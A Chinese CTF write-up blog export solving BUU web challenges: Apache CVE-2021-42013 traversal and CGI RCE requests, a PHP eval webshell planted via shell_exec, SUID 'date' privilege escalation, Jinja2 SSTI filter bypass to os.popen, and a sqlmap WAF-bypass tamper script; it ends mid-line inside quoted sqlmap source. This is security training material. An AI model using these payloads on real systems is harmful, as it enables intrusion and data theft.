<h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><p><em>起初看到 BUU 给了一个不太一样的 URL，结合题目名称以为是个渗透环境，扫了一下端口才意识到主机就是 BUU 源站，那就是扫目录了吧！结果也不是。</em></p>
<p>使用的是一个 CVE：<a class="link"   href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md" >VulHub.CVE-2021-42013 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>访问题目给出的 URL 后跳出的”It works!”正是 vulhub 提供的该 CVE 复现环境的标志。该漏洞出现在”Apache HTTP Server-2.4.50”中，首先是一个目录穿越漏洞，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">/icons/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/etc/passwd</span><br></pre></td></tr></table></figure></div>

<p>访问该路径即可实现目录穿越，读取到”&#x2F;etc&#x2F;passwd”文件；其中的 <code>icons</code> 必须为一个存在且可访问的目录。</p>
<p>如果目标服务开启了”cgi”或”cgid”模块，那么可以由目录穿越拓展到远程代码执行，PoC：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:29066</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;2d-432a5e4a73a80&quot;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">echo</span>;<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div>

<p>用 Get 方式与目录穿越访问 sh，在请求体中带上：<code>echo;&lt;cmd&gt;</code> 即可执行 <code>&lt;cmd&gt;</code> shell 命令。</p>
<p>本题服务并不是起在常见的”&#x2F;var&#x2F;www&#x2F;html”下，因此单纯的目录穿越得不到 flag，利用任意命令执行发现根目录下有改名后的 flag 文件，读取即可。</p>
<p><strong>Tips：</strong></p>
<ol>
<li><p>使用浏览器测试 PoC 会失效，因为 PoC 使用了双重 URL 编码（<code>%%32%65</code> 其实就是 <code>%2e</code>），浏览器会自动为其解码一层，但只有一层时不会解码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">2</span>e</span><br><span class="line">=&gt; %<span class="number">2</span>e</span><br><span class="line">%%<span class="number">32</span>%<span class="number">65</span></span><br><span class="line">=&gt; %<span class="number">252</span>e</span><br><span class="line">%%%<span class="number">33</span>%<span class="number">32</span></span><br><span class="line">=&gt; %%<span class="number">2532</span></span><br></pre></td></tr></table></figure></div>

<p><code>%25</code> 即 <code>%</code> 。被解码内容前的第一个多余百分号会被 URL 编码，其他百分号会被保留。</p>
<hr>
<p>因此建议使用 <code>curl</code> 或 burp 来发送 payload。</p>
</li>
<li><p>“&#x2F;icons”目录用 dirmap 扫不出来，但他在环境中确实存在。这好像不是一个常规文件夹。使用”&#x2F;icons”路由会做文件访问，出现”Not Found”提示；使用”&#x2F;icons&#x2F;“进行正确的文件夹访问，获取到文件夹下的内容。</p>
</li>
<li><p>经测试，PoC 中的『可访问文件夹』必须是真正可访问的（包括权限问题），只是存在的文件夹并不能满足要求。</p>
</li>
</ol>
<h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><p><em>要用到提权的 RCE！太高级辣！</em></p>
<p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>shell_exec()</code> 函数会执行传入的 shell 命令，并返回命令的有效结果，但由于没有 <code>echo</code> ，我们得不到命令的输出。</p>
<p>看起来他不想让我们反弹 shell，尝试用 <code>bas\h</code> 绕过过滤来反弹 shell，发现不行，用 <code>curl</code> 访问 dnslog 发现没反应，目标应该不出网。</p>
<p>目标的 web 服务搭建在常规目录”&#x2F;var&#x2F;www&#x2F;html&#x2F;“下，手动创建一个 php 木马：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>+<span class="string">&quot;&lt;?php+@eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>+&gt;+/var/www/html/pet.php</span><br></pre></td></tr></table></figure></div>

<p>访问木马执行命令，发现根目录下有 flag，但读取不到（无任何反应），可能是空的也可能是权限不足，<code>ls+-al+/</code> 查看权限，发现 flag 无读取权限。</p>
<p>利用 SUID 提权，查找有 SUID 权限的文件&#x2F;命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find+/+-perm+-4000+-<span class="built_in">type</span>+f</span><br><span class="line"><span class="comment"># -4000 表示查询特殊权限位为 s、其他权限位任意的目标，可以换成 -u=s;</span></span><br><span class="line">=&gt; /bin/date /bin/mount /bin/su /bin/umount</span><br></pre></td></tr></table></figure></div>

<p>发现 <code>date</code> 命令有 SUID 权限，<code>date -f &lt;file&gt;</code> 可以读取文件内容，本地测试一下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cool&quot;</span> &gt; a.txt</span><br><span class="line"><span class="built_in">date</span> -f a.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> ‘cool’</span><br></pre></td></tr></table></figure></div>

<p>在报错中回显了目标文件的内容，但 php 的 <code>system</code> 命令并不回显标准错误输出 stderr，因此将其重定向至文件中再读取。Linux 的根目录下”tmp&#x2F;“目录有 777 的权限，可以在其中创建文件也可以读取文件。得到 payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span>+-f+/f*+2&gt;/tmp/flag.txt</span><br><span class="line"><span class="built_in">cat</span>+/tmp/flag.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> <span class="string">&#x27;flag&#123;47e559f1-38b3-47d3-bbf1-db16cad79766&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>成功读取 flag。</p>
<h3 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h3><p><em>第一道不是完全照着题解做出来的 SSTI！</em></p>
<p>哎，SSTI；哎，Python；哎，魔术函数；哎，沙箱逃逸；哎，waf 过滤。SSTI 就突出一个抽象！</p>
<p>题目在 Two 的基础上增加了对”_“的过滤，用 16 进制转义绕过，先读取到 object：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>一个偶然发现的没什么卵用的小知识，用 burp 调试题目时发现，返回的内容 <code>&lt;class &#39;object&#39;&gt;</code> 其实是在前端的，只是被当成标签解析了所以看不见。</p>
<p>另一个没什么卵用的还不知道对不对的发现是，<code>&#39;&#39;[&#39;sth&#39;]</code> 这种读取对象<strong>属性</strong>的替代方式只在 jinja2 的模板语法中有效，在原生的 python shell 中是会报错的</p>
</blockquote>
<p>接着获取其可用的子类，获取子类环境中可用的函数，用 burp 爆破出一个可用一些特殊函数的子类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>要注意 <code>__subclasses__()</code> 是一个函数需要调用！有好多子类是没有任何可调用内容的，随便选了一个 202 就发现里面的 <code>__builtins__.__import__</code> 函数可用。</p>
<blockquote>
<p>这里的标准做法是用 burp 爆破所有子类，寻找其中可用的敏感函数。但是 <code>__globals__</code> 内容有些抽象，暂时不能完整准确的理解，只能提取关键词大致猜测哪些是可用的函数。</p>
</blockquote>
<p>接着利用找到的函数 RCE 即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;][&#x27;\x5f\x5fbuil&#x27;&#x27;tins\x5f\x5f&#x27;][&#x27;\x5f\x5fimp&#x27;&#x27;ort\x5f\x5f&#x27;](&#x27;o&#x27;&#x27;s&#x27;)[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t$&#123;IFS&#125;/f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>替换过滤字符，空格用 <code>$&#123;IFS&#125;</code> ，”flag”用”f*”。</p>
<p><strong>Tips：</strong></p>
<ol>
<li>不知道是 jinja2 模板语法的问题还是题目环境的问题，一些很常见的函数无法使用，例如 <code>len(), chr()</code> </li>
<li><code>requests</code> 惨遭过滤，本来可以考虑用 <code>requests.args.key&amp;key=__class__</code> 来绕过过滤的。</li>
</ol>
<h3 id="Final-Round"><a href="#Final-Round" class="headerlink" title="Final Round"></a>Final Round</h3><p>一道让我更了解 Sqlmap 的题目。</p>
<p>输入留言编号”name”来查询留言，发送请求后只会回显同一种页面，抹杀了布尔盲注的可能。关闭了新建留言的功能，断绝了 Insert 注入的可能。</p>
<p>手动测试了一下，name 为数字型，ban 了一些特殊字符如空格、水平制表符 Tab <code>%09 </code>、换行 <code>%0A</code> 、回车 <code>%0D</code> 以及 <code>*</code> 。空白字符用 <code>%0B</code> 或 <code>%0C</code> 代替，测试出可以时间盲注，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">name=<span class="number">1</span>%<span class="number">0</span>Band%<span class="number">0</span>Bsleep(<span class="number">1</span>)%<span class="number">0</span>Band%<span class="number">0B1</span></span><br></pre></td></tr></table></figure></div>

<p>考虑直接使用 sqlmap 梭哈，由于需要替换空白字符，需要手动编写一个 tamper 脚本，考虑从 sqlmap 自带的脚本中修改，先放上最终版脚本”space2blank.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces (MySQL) instances of space character (&#x27; &#x27;) with a random blank character from a valid set of alternate characters</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass several web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; random.seed(0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%A0id%0CFROM%0Dusers&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ASCII table:</span></span><br><span class="line">    <span class="comment">#   TAB     09      horizontal TAB</span></span><br><span class="line">    <span class="comment">#   LF      0A      new line</span></span><br><span class="line">    <span class="comment">#   FF      0C      new page</span></span><br><span class="line">    <span class="comment">#   CR      0D      carriage return</span></span><br><span class="line">    <span class="comment">#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span></span><br><span class="line">    <span class="comment">#           A0      non-breaking space</span></span><br><span class="line">    blanks = (</span><br><span class="line">            <span class="comment"># &#x27;%09&#x27;, </span></span><br><span class="line">            <span class="comment"># &#x27;%0A&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0C&#x27;</span>, </span><br><span class="line">            <span class="comment"># &#x27;%0D&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0B&#x27;</span> </span><br><span class="line">            <span class="comment"># &#x27;%A0&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="string">&quot;text&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>该脚本将 payload 中非引号括起即字符串的部分的空格全部随机替换为指定空白字符，同时将 payload 中的 <code>*</code> 替换为具体的字段名”text”。</p>
<p>原因是 sqlmap 在探测出目标表的各字段名后，在恢复记录内容之前要先获取记录数量，在查询数量时它使用 <code>*</code> 而非（已经获得的）具体字段名，例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> wfy.wfy_comments</span><br></pre></td></tr></table></figure></div>

<p>由于题目过滤了该字符，会返回 500 的响应，这将导致 sqlmap 会卡在恢复记录数量这一步。</p>
<p>最终有效的 sqlmap payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://87490559-a696-4b64-91bf-4731ae7cbddc.node4.buuoj.cn:81/comments.php --method=POST --data <span class="string">&quot;name=1&quot;</span> -p name --technique T --batch --tamper=diy/space2blank.py -H <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span> --delay=0.1 -D wfy -T wfy_comments -C text --dump</span><br></pre></td></tr></table></figure></div>

<p><strong>参数讲解：</strong></p>
<ol>
<li><p><code>--tamper=</code> 选择自己的脚本位置，我将脚本放在了”diy”文件夹下。（注意要在文件夹下添加 <code>__init__.py</code> 文件，直接 cp 原 tamper 文件夹中的就行）</p>
</li>
<li><p><code>-H &quot;User-Agent: ...&quot;</code> 替换 UA 头，Sqlmap 有自己的默认 UA 头，具有标识度，本体会根据该 UA 头 ban 掉 sqlmap 的流量，响应内容如下：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">HTTP response [#1] (200 OK):^M</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty^M</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 06 Oct 2023 18:33:17 GMT^M</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8^M</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked^M</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close^M</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip^M</span><br><span class="line"><span class="attribute">URI</span><span class="punctuation">: </span>http://160ab2ca-3be9-481d-872f-ce6ba6433864.node4.buuoj.cn:81/comments.php^M</span><br><span class="line">^M</span><br><span class="line">&lt;h1&gt;不许用sqlmap！！！！！&lt;/h1&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>--delay=0.1</code> 为扫描添加 0.1s 的延迟，避免访问过频繁直接被 ban。</p>
</li>
</ol>
<p>最后恢复出 flag：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">retrieved: flag&#123;Ju2t_let_me_s1eep_f0r_a_whi1e&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Sqli-Labs-Master] - Less_26</title>
    <url>/2023/11/01/Security/Range/%5BSqli-Labs-Master%5D%20-%20Less_26/</url>
    <content><![CDATA[<p>与 Less-26 情况基本一致，只是没有报错回显，考虑使用布尔盲注。</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;||if(ascii(substr((),1,1))=115,sleep(1),1)||&#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>当尝试使用 Sqlmap 进行布尔盲注时，突然发现 Sqlmap 没法实现『用括号绕过对空格的过滤』。这不是简单的 Tamper 脚本处理关键词能解决的，这需要在 Sqlmap 的攻击模块中添加额外的 payload 来实现。</p>
<p>也许只能手动盲注或者自行编写盲注脚本来实现。</p>
<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>这里在测试 Sqlmap 布尔盲注时遇到了非常奇怪的问题，困扰了我很久。首先是多个『Tamper』使用的问题。</p>
<p>假设空字符并未被完全过滤，那么这里需要用到两个脚本『symboliclogical.py』（下略为 symb）与『space2randomblank.py』（下略为 space），前者用于替换逻辑运算符：<code>and -&gt; &amp;&amp;</code>；后者用于替换空白字符。查看源码会发现『space2randomblank.py』的优先级为『Low』高于 symb 的『Lowest』，当给出参数 <code>--tamper=space2randomblank,symboliclogical</code> 时 symb 不会起效；调换顺序 <code>--tamper=symboliclogical,space2randomblank</code> ，Sqlmap 会提示你弄反了脚本的调用顺序（优先级）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">it appears that you might have mixed the order of tamper scripts. Do you want to auto resolve this? [Y/n/q]</span><br></pre></td></tr></table></figure></div>

<p>输入 Y 会出现和上面一样的情况，symb 不起效；输入 n 强行以错误顺序调用脚本，symb 和 space 都起效。<br><em>Tips：将两个脚本的优先级调整为相同也能解决该问题。</em></p>
<p>为了让 sqlmap 成功识别出布尔盲注的注入点，需要在 payload 中保证：</p>
<ol>
<li>默认的请求得到的是有效页面（可理解为查询成功）</li>
<li>需要提供有效页面&#x2F;无效页面的标志，如返回『Your Login name:』时表示查询有效，则提供 <code>--string=&quot;Your Login name:&quot;</code> 。</li>
</ol>
<p>除此之外在遵循<strong>假设</strong>的前提下还需要保证空白字符被替换，因此需要用到脚本模块 Tamper。</p>
<p>但是使用不同的脚本 sqlmap 会有不同的反应。sqlmap 提供了很多空白字符替换的脚本，如『space2randomblank.py』（下略为 rblank）与『space2mysqlblank.py』（下略为 mblank），前者将 <code>%20</code> 随机替换为 <code>(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)</code> 中的一个，后者则会替换为更生僻的字符如 <code>%A0</code> 。使用 rblank 时 sqlmap 会发现布尔盲注的注入点，但它的 <code>falsePositiveCheck</code> 随即会认为该注入点是误判：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[WARNING] <span class="literal">false</span> positive <span class="keyword">or</span> unexploitable injection point detected</span><br></pre></td></tr></table></figure></div>

<p>而使用 mblank 时 Sqlmap 也能正确检测出布尔盲注，并且没有<strong>否定注入点</strong>，但它恢复不出任何内容。什么原因呢，我们需要研究一下 Sqlmap 的『falsePositiveCheck』模块的源码，根据关键词『false positive or unexploitable injection point detected』我们可以在源码中找到这个函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkFalsePositives</span>(<span class="params">injection</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Checks for false positives (only in single special cases)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) <span class="keyword">for</span> _ <span class="keyword">in</span> injection.data) <span class="keyword">or</span> (<span class="built_in">len</span>(injection.data) == <span class="number">1</span> <span class="keyword">and</span> PAYLOAD.TECHNIQUE.UNION <span class="keyword">in</span> injection.data <span class="keyword">and</span> <span class="string">&quot;Generic&quot;</span> <span class="keyword">in</span> injection.data[PAYLOAD.TECHNIQUE.UNION].title):</span><br><span class="line">        pushValue(kb.injection)</span><br><span class="line"></span><br><span class="line">        infoMsg = <span class="string">&quot;checking if the injection point on %s &quot;</span> % injection.place</span><br><span class="line">        infoMsg += <span class="string">&quot;parameter &#x27;%s&#x27; is a false positive&quot;</span> % injection.parameter</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_</span>():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(randomInt(<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        kb.injection = injection</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> level <span class="keyword">in</span> xrange(conf.level):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                randInt1, randInt2, randInt3 = (_() <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">                randInt1 = <span class="built_in">min</span>(randInt1, randInt2, randInt3)</span><br><span class="line">                randInt3 = <span class="built_in">max</span>(randInt1, randInt2, randInt3)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> conf.string <span class="keyword">and</span> <span class="built_in">any</span>(conf.string <span class="keyword">in</span> getUnicode(_) <span class="keyword">for</span> _ <span class="keyword">in</span> (randInt1, randInt2, randInt3)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> conf.notString <span class="keyword">and</span> <span class="built_in">any</span>(conf.notString <span class="keyword">in</span> getUnicode(_) <span class="keyword">for</span> _ <span class="keyword">in</span> (randInt1, randInt2, randInt3)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> randInt3 &gt; randInt2 &gt; randInt1:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt1)):</span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">not</span> <span class="keyword">in</span> injection.data:</span><br><span class="line">                checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt2))          <span class="comment"># just in case if DBMS hasn&#x27;t properly recovered from previous delayed request</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt3)):          <span class="comment"># this must not be evaluated to True</span></span><br><span class="line">                retVal = <span 